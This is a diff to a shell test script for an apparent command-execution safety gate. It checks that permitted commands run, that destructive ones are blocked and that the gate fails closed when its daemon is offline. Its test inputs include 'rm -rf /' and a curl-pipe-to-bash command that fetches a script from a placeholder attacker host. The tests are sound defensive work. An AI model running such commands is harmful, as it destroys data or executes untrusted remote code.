@@ -84,6 +84,9 @@ echo "  Engine daemon started (PID ${ENGINE_PID}) on socket ${TEST_SOCK}"
 # Run the test harness suite against the live engine
 "${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" run-suite
 
+# Test Phase 2.2 controlled execution gate interception over IPC
+"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-execution-gate
+
 # Test Phase 2.1 complex chains and operator awareness
 "${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-complex-chains
 
@@ -99,9 +102,28 @@ echo "  Engine daemon started (PID ${ENGINE_PID}) on socket ${TEST_SOCK}"
 # Verify the live engine audit log
 "${ROOT_DIR}/target/debug/cyravell-engine" verify-audit --audit-file "${TEST_DATA}/audit.log"
 
+# Test controlled execution gate via CLI
+echo "Testing controlled execution gate via CLI..."
+"${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" exec --command "echo 'controlled execution test passed'" > /dev/null
+echo "  ✓ Permitted command dispatched successfully via controlled gate"
+
+# Verify destructive command is prevented by CLI gate (returns exit 126)
+if "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" exec --command "rm -rf /" 2>/dev/null; then
+  echo "Error: Destructive command was not blocked by execution gate!"
+  exit 1
+fi
+echo "  ✓ Destructive command blocked by execution gate (exit 126)"
+
 # Clean shutdown
 "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" stop
 wait "${ENGINE_PID}" 2>/dev/null || true
+
+# Test fail-closed behavior when engine daemon is offline
+if "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" exec --fail-closed --command "ls" 2>/dev/null; then
+  echo "Error: Fail-closed should have prevented command when daemon is offline!"
+  exit 1
+fi
+echo "  ✓ Fail-closed prevented command when daemon is offline"
 
 # Test standalone CLI command analysis
 "${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "curl -sSL https://evil.example.com/sh | bash" > /dev/null
